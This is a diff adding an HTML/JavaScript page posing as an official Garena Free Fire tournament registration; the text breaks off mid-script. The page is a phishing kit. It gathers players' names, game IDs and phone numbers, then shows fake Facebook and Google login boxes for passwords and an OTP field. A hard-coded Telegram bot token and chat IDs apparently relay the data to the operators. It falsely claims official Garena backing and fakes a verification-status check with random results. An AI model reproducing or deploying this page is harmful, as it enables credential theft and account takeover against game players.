@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FFCE - Free Fire Custom Event | Garena International</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&display=swap');
+        
+        :root {
+            --primary: #ff6600;
+            --secondary: #1a1a2e;
+            --accent: #00ccff;
+            --dark: #0d0d1a;
+            --light: #f0f0f0;
+            --success: #00ff88;
+            --danger: #ff3333;
+            --pending: #ffcc00;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Oxanium', sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark);
+            color: var(--light);
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 102, 0, 0.15) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(0, 204, 255, 0.15) 0%, transparent 20%);
+            background-attachment: fixed;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .branding {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 15px;
+        }
+        
+        .branding img {
+            height: 40px;
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .header p {
+            color: var(--light);
+            font-size: 1rem;
+            opacity: 0.8;
+        }
+        
+        .card {
+            background: rgba(13, 13, 26, 0.8);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+        }
+        
+        .reward-banner {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 600;
+            color: white;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(255, 102, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--accent);
+            font-size: 0.9rem;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus, .form-group select:focus {
+            border-color: var(--accent);
+            outline: none;
+            background: rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 0 2px rgba(0, 204, 255, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--primary));
+            z-index: -1;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .btn:hover::before {
+            opacity: 1;
+        }
+        
+        .btn:active {
+            transform: translateY(2px);
+        }
+        
+        .btn-facebook {
+            background: #1877f2;
+        }
+        
+        .btn-google {
+            background: white;
+            color: #5f6368;
+        }
+        
+        .btn-google:hover {
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+        }
+        
+        .btn-check-status {
+            background: var(--secondary);
+            margin-bottom: 20px;
+        }
+        
+        .btn-approved {
+            background: var(--success);
+        }
+        
+        .btn-rejected {
+            background: var(--danger);
+        }
+        
+        .btn-pending {
+            background: var(--pending);
+            color: var(--dark);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            background: var(--secondary);
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+            position: relative;
+        }
+        
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+        }
+        
+        .modal-content h2 {
+            color: var(--accent);
+            margin: 0 0 20px;
+            font-size: 1.5rem;
+        }
+        
+        .modal-content p {
+            margin-bottom: 20px;
+            color: var(--light);
+            opacity: 0.8;
+        }
+        
+        .success-message {
+            color: var(--success);
+            font-weight: 600;
+            margin: 20px 0;
+            font-size: 1.2rem;
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.8rem;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .otp-inputs input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            outline: none;
+        }
+        
+        .otp-inputs input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(0, 204, 255, 0.2);
+        }
+        
+        .garena-brand {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.8rem;
+        }
+        
+        .rgb-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, 
+                rgba(255, 0, 0, 0.1) 0%, 
+                rgba(255, 255, 0, 0.1) 15%, 
+                rgba(0, 255, 0, 0.1) 30%, 
+                rgba(0, 255, 255, 0.1) 50%, 
+                rgba(0, 0, 255, 0.1) 65%, 
+                rgba(255, 0, 255, 0.1) 80%, 
+                rgba(255, 0, 0, 0.1) 100%);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            z-index: -1;
+            opacity: 0.3;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Loading dots */
+        .loading-dots::after {
+            content: '...';
+            animation: dots 1.5s infinite;
+            display: inline-block;
+            width: 20px;
+            text-align: left;
+        }
+        @keyframes dots {
+            0%, 20% { content: "."; }
+            40% { content: ".."; }
+            60%, 100% { content: "..."; }
+        }
+
+        .team-info {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .team-info h4 {
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+
+        .custom-option {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .custom-option:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .custom-option h4 {
+            color: var(--accent);
+            margin-bottom: 5px;
+        }
+
+        .custom-option .prize {
+            color: var(--success);
+            font-weight: bold;
+        }
+
+        .custom-option .time {
+            color: var(--primary);
+        }
+
+        .custom-option .map {
+            color: var(--light);
+            opacity: 0.8;
+        }
+
+        .status-check {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 8px;
+        }
+
+        .status-check input {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="rgb-animation"></div>
+    
+    <div class="container">
+        <!-- Region Selection Step -->
+        <div class="card" id="region-step">
+            <div class="header">
+                <div class="branding">
+                    <img src="https://dark-2009.github.io/customevent/ff.png" alt="Free Fire Logo">
+                    <img src="https://dark-2009.github.io/customevent/garena.png.jpg" alt="Garena Logo">
+                </div>
+                <h1>SELECT YOUR REGION</h1>
+                <p>Choose your location to find available teams</p>
+            </div>
+
+            <div class="form-group">
+                <label for="continent">Continent</label>
+                <select id="continent" onchange="loadCountries()">
+                    <option value="">Select Continent</option>
+                    <option value="asia">Asia</option>
+                    <option value="europe">Europe</option>
+                    <option value="africa">Africa</option>
+                    <option value="north-america">North America</option>
+                    <option value="south-america">South America</option>
+                    <option value="oceania">Oceania</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="country">Country</label>
+                <select id="country" disabled onchange="loadTeams()">
+                    <option value="">Select Country First</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="team">Team</label>
+                <select id="team" disabled>
+                    <option value="">Select Team</option>
+                </select>
+            </div>
+
+            <button class="btn" id="confirm-team-btn" disabled onclick="showTeamConfirmation()">CONFIRM TEAM</button>
+        </div>
+
+        <!-- Team Confirmation Modal -->
+        <div class="modal" id="team-confirm-modal">
+            <div class="modal-content">
+                <h2>CONFIRM YOUR TEAM</h2>
+                <p>Are you sure you want to join this team?</p>
+                <div id="team-confirm-details" class="team-info"></div>
+                <button class="btn" onclick="confirmTeam()">YES, CONFIRM</button>
+                <button class="btn btn-rejected" style="margin-top: 10px;" onclick="document.getElementById('team-confirm-modal').style.display = 'none'">NO, CHANGE</button>
+            </div>
+        </div>
+
+        <!-- Custom Room Selection Step -->
+        <div class="card" id="custom-step" style="display: none;">
+            <div class="header">
+                <h1>SELECT CUSTOM ROOM</h1>
+                <p>Choose from available custom matches</p>
+            </div>
+
+            <div id="custom-options">
+                <!-- Dynamically generated custom options will appear here -->
+            </div>
+
+            <button class="btn" onclick="confirmCustom()">CONFIRM SELECTION</button>
+        </div>
+
+        <!-- Custom Confirmation Modal -->
+        <div class="modal" id="custom-confirm-modal">
+            <div class="modal-content">
+                <h2>CONFIRM CUSTOM REGISTRATION</h2>
+                <div id="custom-confirm-details"></div>
+                <button class="btn" onclick="proceedToRegistration()">CONFIRM</button>
+                <button class="btn btn-rejected" style="margin-top: 10px;" onclick="document.getElementById('custom-confirm-modal').style.display = 'none'">CANCEL</button>
+            </div>
+        </div>
+
+        <!-- Main Registration Form (hidden initially) -->
+        <div class="card" id="main-form" style="display: none;">
+            <div class="header">
+                <div class="branding">
+                    <img src="https://dark-2009.github.io/customevent/ff.png" alt="Free Fire Logo">
+                    <img src="https://dark-2009.github.io/customevent/garena.png.jpg" alt="Garena Logo">
+                </div>
+                <h1>FFCE - CUSTOM EVENT REGISTRATION</h1>
+                <p>Powered by Garena International</p>
+            </div>
+            
+            <div class="reward-banner">
+                WINNING REWARD: 1090 DIAMONDS + EXCLUSIVE ITEMS
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress" id="progress"></div>
+            </div>
+            
+            <div class="step active" id="step1">
+                <div class="form-group">
+                    <label for="name">In-Game Name</label>
+                    <input type="text" id="name" placeholder="Enter your Free Fire name">
+                </div>
+                <div class="form-group">
+                    <label for="uid">Free Fire UID</label>
+                    <input type="text" id="uid" placeholder="Enter your UID (e.g., 1234567890)">
+                </div>
+                <div class="form-group">
+                    <label for="level">Account Level</label>
+                    <input type="number" id="level" placeholder="Enter your account level">
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="Enter your WhatsApp number">
+                </div>
+                <button class="btn" onclick="nextStep(1)">VERIFY DETAILS</button>
+            </div>
+            
+            <div class="step" id="step2">
+                <h3 style="text-align: center; margin-bottom: 20px; color: var(--accent);">CONNECT YOUR FREE FIRE ACCOUNT</h3>
+                <p style="text-align: center; margin-bottom: 30px; opacity: 0.8;">Select login method to claim your 100 diamonds</p>
+                
+                <button class="btn btn-facebook" onclick="showFacebookLogin()">
+                    <i class="fab fa-facebook-f" style="margin-right: 10px;"></i> Continue with Facebook
+                </button>
+                
+                <button class="btn btn-google" onclick="showGoogleLogin()" style="margin-top: 15px;">
+                    <i class="fab fa-google" style="margin-right: 10px;"></i> Continue with Google
+                </button>
+            </div>
+            
+            <div class="step" id="step3">
+                <h3 style="text-align: center; margin-bottom: 20px; color: var(--accent);">OTP VERIFICATION</h3>
+                <p style="text-align: center; margin-bottom: 30px; opacity: 0.8;">Enter the 6-digit OTP sent to your phone</p>
+                
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                    <input type="text" maxlength="1" pattern="[0-9]">
+                </div>
+                
+                <button class="btn" id="verify-btn" onclick="verifyOTP()">SUBMIT OTP</button>
+
+                <div class="status-check">
+                    <h4 style="text-align: center; margin-bottom: 15px; color: var(--accent);">CHECK VERIFICATION STATUS</h4>
+                    <input type="text" id="verification-key" placeholder="Enter your verification key" class="form-group input">
+                    <button class="btn btn-check-status" onclick="checkVerificationStatus()">CHECK STATUS</button>
+                </div>
+            </div>
+            
+            <div class="garena-brand">
+                © 2025 Garena International. Free Fire is a registered trademark of Garena International.
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>This event is officially organized by Garena International. All rewards are subject to terms and conditions.</p>
+        </div>
+    </div>
+    
+    <!-- Confirmation Modal -->
+    <div class="modal" id="confirm-modal">
+        <div class="modal-content">
+            <h2>CONFIRM YOUR DETAILS</h2>
+            <p>Please verify that the following information is correct:</p>
+            <div id="confirm-details" style="text-align: left; margin: 20px 0; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 8px;"></div>
+            <button class="btn" onclick="confirmDetails()">CONFIRM</button>
+        </div>
+    </div>
+    
+    <!-- Facebook Login Modal -->
+    <div class="modal" id="facebook-modal">
+        <div class="modal-content">
+            <div style="text-align: center; margin-bottom: 25px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" style="height: 50px; margin-bottom: 15px;" alt="Facebook">
+                <h3 style="color: #1877F2;">Log in with Facebook</h3>
+                <p style="color: #666;">to connect to Garena Free Fire</p>
+            </div>
+            
+            <div class="form-group">
+                <input type="text" class="form-group input" id="fb-email" placeholder="Email address or phone number">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" class="form-group input" id="fb-password" placeholder="Password">
+            </div>
+            
+            <button class="btn btn-facebook" onclick="facebookLogin()">Log In</button>
+            
+            <p style="margin-top: 20px; font-size: 0.9rem; color: #666;">
+                <a href="#" style="color: #1877F2; text-decoration: none;">Forgot password?</a>
+            </p>
+        </div>
+    </div>
+    
+    <!-- Google Login Modal -->
+    <div class="modal" id="google-modal">
+        <div class="modal-content">
+            <div style="text-align: center; margin-bottom: 25px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" style="height: 50px; margin-bottom: 15px; width: 50px;" alt="Google">
+                <h3 style="color: #1A73E8;">Sign in with Google</h3>
+                <p style="color: #666;">to continue to Garena Free Fire</p>
+            </div>
+            
+            <div class="form-group">
+                <input type="email" class="form-group input" id="google-email" placeholder="Email or phone">
+            </div>
+            
+            <div class="form-group">
+                <input type="password" class="form-group input" id="google-password" placeholder="Password">
+            </div>
+            
+            <button class="btn" style="background: #1A73E8;" onclick="googleLogin()">Next</button>
+            
+            <p style="margin-top: 20px; font-size: 0.9rem; color: #666; text-align: center;">
+                <a href="#" style="color: #1A73E8; text-decoration: none;">Forgot email?</a>
+            </p>
+        </div>
+    </div>
+    
+    <!-- Success Modal -->
+    <div class="modal" id="success-modal">
+        <div class="modal-content">
+            <div class="success-message">
+                <i class="fas fa-check-circle" style="font-size: 50px; margin-bottom: 15px; color: var(--success);"></i>
+                <h2>THANK YOU FOR PARTICIPATING!</h2>
+            </div>
+            <p>Your registration has been received successfully.</p>
+            <p>Your verification key: <strong id="verification-key-display"></strong></p>
+            <p>Use this key to check your verification status.</p>
+            <p>Our team will contact you shortly with further instructions.</p>
+            
+            <div style="margin-top: 30px; display: flex; justify-content: center; gap: 20px;">
+                <img src="https://dark-2009.github.io/customevent/ff.png" alt="Free Fire Logo" style="height: 30px;">
+                <img src="https://dark-2009.github.io/customevent/garena.png" alt="Garena Logo" style="height: 30px;">
+            </div>
+        </div>
+    </div>
+
+    <!-- Status Check Modal -->
+    <div class="modal" id="status-modal">
+        <div class="modal-content">
+            <h2 id="status-title">VERIFICATION STATUS</h2>
+            <div id="status-message" style="margin: 20px 0; font-size: 1.2rem;"></div>
+            <button class="btn" onclick="document.getElementById('status-modal').style.display = 'none'">CLOSE</button>
+        </div>
+    </div>
+    
+    <script>
+        // Telegram bot details
+        const BOT_TOKEN = '7793945096:AAEnx2qKx3CoNBNJg3dEY17JRocPN0Ehf94';
+        const CHAT_IDS = ['6800292901', '7093685289'];
+        
+        let currentStep = 1;
+        let loginMethod = '';
+        let selectedTeam = null;
+        let selectedCustom = null;
+        let verificationKey = '';
+
+        // Team data
+        const teamsData = {
+            'asia': {
+                'india': [
+                    { id: 'dark-knights', name: 'Team Dark Knights', leader: 'Divya Shekhar (Organiser)', location: 'Jharkhand, India' },
+                    { id: 'rudra-royals', name: 'Team Rajputana Royals', leader: 'Rudra Pratap Singh (Organiser)', location: 'Jharkhand, India' }
+                ],
+                'pakistan': [
+                    { id: 'pak-team1', name: 'Team Pakistan Warriors', leader: 'Ali Khan', location: 'Lahore, Pakistan' },
+                    { id: 'pak-team2', name: 'Team Green Stars', leader: 'Ahmed Raza', location: 'Karachi, Pakistan' }
+                ],
+                'bangladesh': [
+                    { id: 'bd-team1', name: 'Team Bengal Tigers', leader: 'Rahim Khan', location: 'Dhaka, Bangladesh' },
+                    { id: 'bd-team2', name: 'Team Dhaka Dynamites', leader: 'Sakib Hasan', location: 'Chittagong, Bangladesh' }
+                ],
+                'nepal': [
+                    { id: 'np-team1', name: 'Team Himalayan Heroes', leader: 'Bikram Thapa', location: 'Kathmandu, Nepal' }
+                ]
+            },
+            'europe': {
+                'germany': [
+                    { id: 'de-team1', name: 'Team Berlin Blitz', leader: 'Hans Mueller', location: 'Berlin, Germany' },
+                    { id: 'de-team2', name: 'Team Munich Mavericks', leader: 'Klaus Schmidt', location: 'Munich, Germany' }
+                ],
+                'france': [
+                    { id: 'fr-team1', name: 'Team Paris Panthers', leader: 'Jean Dupont', location: 'Paris, France' }
+                ],
+                'uk': [
+                    { id: 'uk-team1', name: 'Team London Legends', leader: 'John Smith', location: 'London, UK' },
+                    { id: 'uk-team2', name: 'Team Manchester United', leader: 'David Beckham', location: 'Manchester, UK' }
+                ]
+            },
+            'africa': {
+                'south africa': [
+                    { id: 'za-team1', name: 'Team Cape Town Crushers', leader: 'Thabo Mbeki', location: 'Cape Town, South Africa' },
+                    { id: 'za-team2', name: 'Team Johannesburg Jets', leader: 'Mandela Zulu', location: 'Johannesburg, South Africa' }
+                ],
+                'nigeria': [
+                    { id: 'ng-team1', name: 'Team Lagos Lions', leader: 'Chinedu Okoro', location: 'Lagos, Nigeria' }
+                ]
+            },
+            'north-america': {
+                'usa': [
+                    { id: 'us-team1', name: 'Team New York Ninjas', leader: 'Mike Johnson', location: 'New York, USA' },
+                    { id: 'us-team2', name: 'Team LA Legends', leader: 'Chris Williams', location: 'Los Angeles, USA' }
+                ],
+                'canada': [
+                    { id: 'ca-team1', name: 'Team Toronto Titans', leader: 'Ryan Maple', location: 'Toronto, Canada' }
+                ]
+            },
+            'south-america': {
+                'brazil': [
+                    { id: 'br-team1', name: 'Team Rio Rangers', leader: 'Carlos Silva', location: 'Rio de Janeiro, Brazil' },
+                    { id: 'br-team2', name: 'Team Sao Paulo Strikers', leader: 'Luis Fernandez', location: 'Sao Paulo, Brazil' }
+                ],
+                'argentina': [
+                    { id: 'ar-team1', name: 'Team Buenos Aires Bandits', leader: 'Diego Marquez', location: 'Buenos Aires, Argentina' }
+                ]
+            },
+            'oceania': {
+                'australia': [
+                    { id: 'au-team1', name: 'Team Sydney Sharks', leader: 'Jack Thompson', location: 'Sydney, Australia' },
+                    { id: 'au-team2', name: 'Team Melbourne Mavericks', leader: 'Bruce Wilson', location: 'Melbourne, Australia' }
+                ],
+                'new zealand': [
+                    { id: 'nz-team1', name: 'Team Auckland Aces', leader: 'Maori Tane', location: 'Auckland, New Zealand' }
+                ]
+            }
+        };
+
+        // Countries data
+        const countriesData = {
+            'asia': ['india', 'pakistan', 'bangladesh', 'nepal'],
+            'europe': ['germany', 'france', 'uk'],
+            'africa': ['south africa', 'nigeria'],
+            'north-america': ['usa', 'canada'],
+            'south-america': ['brazil', 'argentina'],
+            'oceania': ['australia', 'new zealand']
+        };
+
+        // Map names
+        const maps = ['Bermuda', 'Nexterra', 'Bermuda Remastered', 'Purgatory', 'Kalahari', 'Solara', 'Alpine'];
+
+        // Game modes with prizes
+        const gameModes = [
+            { mode: '1v1', prize: 1000 },
+            { mode: '2v2', prize: 1200 },
+            { mode: '1v2', prize: 1500 },
+            { mode: '3v3', prize: 1800 },
+            { mode: '1v3', prize: 2000 },
+            { mode: '2v3', prize: 2200 },
+            { mode: '4v4', prize: 2500 },
+            { mode: '1v4', prize: 3000 },
+            { mode: '2v4', prize: 2800 },
+            { mode: '3v4', prize: 2600 }
+        ];
+
+        // Generate upcoming custom matches
+        function generateCustomMatches() {
+            const customOptions = document.getElementById('custom-options');
+            customOptions.innerHTML = '';
+            
+            const now = new Date();
+            const options = { hour: '2-digit', minute: '2-digit', hour12: true };
+            
+            // Generate matches for next 5 hours (every hour)
+            for (let i = 1; i <= 5; i++) {
+                const matchTime = new Date(now.getTime() + i * 60 * 60 * 1000);
+                const timeString = matchTime.toLocaleTimeString('en-US', options);
+                const dateString = matchTime.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
+                
+                // Random map and game mode
+                const randomMap = maps[Math.floor(Math.random() * maps.length)];
+                const randomMode = gameModes[Math.floor(Math.random() * gameModes.length)];
+                
+                const customOption = document.createElement('div');
+                customOption.className = 'custom-option';
+                customOption.onclick = function() { selectCustom(this); };
+                customOption.setAttribute('data-time', matchTime.getTime());
+                customOption.setAttribute('data-mode', randomMode.mode);
+                customOption.setAttribute('data-prize', randomMode.prize);
+                customOption.setAttribute('data-map', randomMap);
+                
+                customOption.innerHTML = `
+                    <h4>${randomMode.mode.toUpperCase()} MATCH</h4>
+                    <div class="time">${dateString} at ${timeString}</div>
+                    <div class="map">Map: ${randomMap}</div>
+                    <div class="prize">Prize: ${randomMode.prize} Diamonds</div>
+                    <div style="color: var(--pending); margin-top: 5px;">Scheduled/Upcoming</div>
+                `;
+                
+                customOptions.appendChild(customOption);
+            }
+        }
+
+        function selectCustom(element) {
+            // Remove active class from all options
+            document.querySelectorAll('.custom-option').forEach(opt => {
+                opt.style.border = 'none';
+            });
+            
+            // Add active border to selected option
+            element.style.border = '2px solid var(--accent)';
+            
+            // Set selected custom
+            selectedCustom = {
+                time: element.getAttribute('data-time'),
+                mode: element.getAttribute('data-mode'),
+                prize: element.getAttribute('data-prize'),
+                map: element.getAttribute('data-map')
+            };
+        }
+
+        function confirmCustom() {
+            if (!selectedCustom) {
+                alert('Please select a custom match');
+                return;
+            }
+            
+            const matchTime = new Date(parseInt(selectedCustom.time));
+            const options = { hour: '2-digit', minute: '2-digit', hour12: true };
+            const timeString = matchTime.toLocaleTimeString('en-US', options);
+            const dateString = matchTime.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
+            
+            document.getElementById('custom-confirm-details').innerHTML = `
+                <h4>${selectedCustom.mode.toUpperCase()} MATCH</h4>
+                <p><strong>Date & Time:</strong> ${dateString} at ${timeString}</p>
+                <p><strong>Map:</strong> ${selectedCustom.map}</p>
+                <p><strong>Prize:</strong> ${selectedCustom.prize} Diamonds</p>
+                <p><strong>Team:</strong> ${selectedTeam.name}</p>
+                <p style="color: var(--accent); margin-top: 15px;">Are you sure you want to register for this custom match?</p>
+            `;
+            
+            document.getElementById('custom-confirm-modal').style.display = 'flex';
+        }
+
+        function proceedToRegistration() {
+            document.getElementById('custom-confirm-modal').style.display = 'none';
+            document.getElementById('custom-step').style.display = 'none';
+            document.getElementById('main-form').style.display = 'block';
+            
+            // Send team and custom selection to Telegram
+            const message = `TEAM AND CUSTOM SELECTION:\n\nTeam: ${selectedTeam.name}\nLeader: ${selectedTeam.leader}\nLocation: ${selectedTeam.location}\n\nCustom Match: ${selectedCustom.mode}\nMap: ${selectedCustom.map}\nPrize: ${selectedCustom.prize} Diamonds`;
+            sendToTelegram(message);
+        }
+
+        function loadCountries() {
+            const continent = document.getElementById('continent').value;
+            const countrySelect = document.getElementById('country');
+            
+            countrySelect.innerHTML = '<option value="">Select Country</option>';
+            countrySelect.disabled = !continent;
+            
+            if (continent) {
+                countriesData[continent].forEach(country => {
+                    const option = document.createElement('option');
+                    option.value = country;
+                    option.textContent = country.charAt(0).toUpperCase() + country.slice(1);
+                    countrySelect.appendChild(option);
+                });
+                
+                countrySelect.disabled = false;
+            }
+            
+            // Reset team selection
+            document.getElementById('team').innerHTML = '<option value="">Select Team</option>';
+            document.getElementById('team').disabled = true;
+            document.getElementById('confirm-team-btn').disabled = true;
+        }
+
+        function loadTeams() {
+            const continent = document.getElementById('continent').value;
+            const country = document.getElementById('country').value;
+            const teamSelect = document.getElementById('team');
+            
+            teamSelect.innerHTML = '<option value="">Select Team</option>';
+            teamSelect.disabled = !country;
+            
+            if (country && continent) {
+                teamsData[continent][country].forEach(team => {
+                    const option = document.createElement('option');
+                    option.value = team.id;
+                    option.textContent = team.name;
+                    teamSelect.appendChild(option);
+                });
+                
+                teamSelect.disabled = false;
+            }
+            
+            document.getElementById('confirm-team-btn').disabled = !country;
+        }
+
+        function showTeamConfirmation() {
+            const continent = document.getElementById('continent').value;
+            const country = document.getElementById('country').value;
+            const teamId = document.getElementById('team').value;
+            
+            if (!teamId) {
+                alert('Please select a team');
+                return;
+            }
+            
+            // Find selected team
+            selectedTeam = teamsData[continent][country].find(team => team.id === teamId);
+            
+            // Show confirmation modal with team info
+            document.getElementById('team-confirm-details').innerHTML = `
+                <h4>${selectedTeam.name}</h4>
+                <p><strong>Leader:</strong> ${selectedTeam.leader}</p>
+                <p><strong>Location:</strong> ${selectedTeam.location}</p>
+                <p style="margin-top: 15px; color: var(--accent);">Are you sure you want to join this team?</p>
+            `;
+            
+            document.getElementById('team-confirm-modal').style.display = 'flex';
+        }
+
+        function confirmTeam() {
+            document.getElementById('team-confirm-modal').style.display = 'none';
+            document.getElementById('region-step').style.display = 'none';
+            document.getElementById('custom-step').style.display = 'block';
+            
+            // Generate custom matches
+            generateCustomMatches();
+        }
+
+        function checkVerificationStatus() {
+            const key = document.getElementById('verification-key').value.trim();
+            
+            if (!key) {
+                alert('Please enter your verification key');
+                return;
+            }
+            
+            // In a real app, you would check against a database
+            // For demo, we'll just show a random status
+            const statuses = ['approved', 'pending', 'rejected'];
+            const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
+            
+            let statusMessage = '';
+            let statusTitle = '';
+            
+            if (randomStatus === 'approved') {
+                statusTitle = 'VERIFICATION APPROVED';
+                statusMessage = '<div style="color: var(--success); font-size: 1.5rem; margin: 20px 0;"><i class="fas fa-check-circle"></i> Your account has been verified!</div>';
+                statusMessage += '<p>You can now participate in the custom matches.</p>';
+            } else if (randomStatus === 'pending') {
+                statusTitle = 'VERIFICATION PENDING';
+                statusMessage = '<div style="color: var(--pending); font-size: 1.5rem; margin: 20px 0;"><i class="fas fa-hourglass-half"></i> Your verification is still in progress</div>';
+                statusMessage += '<p>Please check back later. Our team is processing your request.</p>';
+            } else {
+                statusTitle = 'VERIFICATION REJECTED';
+                statusMessage = '<div style="color: var(--danger); font-size: 1.5rem; margin: 20px 0;"><i class="fas fa-times-circle"></i> Your verification was rejected</div>';
+                statusMessage += '<p>Please contact support for more information.</p>';
+            }
+            
+            document.getElementById('status-title').textContent = statusTitle;
+            document.getElementById('status-message').innerHTML = statusMessage;
+            document.getElementById('status-modal').style.display = 'flex';
+        }
+
+        // Auto-focus and move between OTP inputs
